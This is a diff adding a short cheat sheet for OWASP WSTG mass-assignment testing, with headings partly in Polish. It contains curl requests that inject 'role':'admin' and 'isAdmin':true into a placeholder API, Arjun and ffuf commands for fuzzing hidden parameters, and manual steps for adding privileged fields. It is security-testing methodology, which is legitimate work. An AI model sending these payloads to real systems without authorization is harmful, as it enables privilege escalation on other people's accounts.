@@ -1,0 +1,47 @@
+================================================================================
+WSTG-INPV-20 — Testing for Mass Assignment
+================================================================================
+CELE:
+- Identify requests that modify objects
+- Assess if it is possible to modify fields never intended to be modified from outside
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Dodawanie ukrytych parametrow do requestow ---
+curl -X POST "https://TARGET/api/user" -H "Content-Type: application/json" -d '{"name":"test","role":"admin"}'
+curl -X POST "https://TARGET/api/user" -H "Content-Type: application/json" -d '{"name":"test","isAdmin":true}'
+curl -X PUT "https://TARGET/api/user/1" -H "Content-Type: application/json" -d '{"name":"test","verified":true,"role":"admin"}'
+
+# --- Arjun - odkrywanie ukrytych parametrow ---
+arjun -u "https://TARGET/api/user" -m POST
+
+# --- Param Miner (Burp extension) ---
+# Testuj automatyczne wykrywanie ukrytych parametrow
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- SecLists parameter names ---
+# Do Arjun lub Burp Param Miner:
+# /home/parallels/Desktop/WSTG/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt
+
+# --- Bug-Bounty-Wordlists hidden parameters ---
+ffuf -u "https://TARGET/api/user" -X POST -H "Content-Type: application/json" -d '{"name":"test","FUZZ":"true"}' -w /home/parallels/Desktop/WSTG/Bug-Bounty-Wordlists-main/parameter_names.txt -mc all -o output_ffuf_mass.json
+
+# --- PayloadsAllTheThings Mass Assignment ---
+# Referencja: /home/parallels/Desktop/WSTG/PayloadsAllTheThings-master/Mass Assignment/README.md
+
+# --- PayloadsAllTheThings Hidden Parameters ---
+# Referencja: /home/parallels/Desktop/WSTG/PayloadsAllTheThings-master/Hidden Parameters/README.md
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Zidentyfikuj endpointy modyfikujace obiekty (POST, PUT, PATCH)
+2. Sprawdz dokumentacje API pod katem wszystkich pol obiektu
+3. Dodaj pola: role, isAdmin, verified, active, balance, credits
+4. Porownaj odpowiedz z dodanymi polami vs bez
+5. Testuj na endpointach rejestracji i aktualizacji profilu
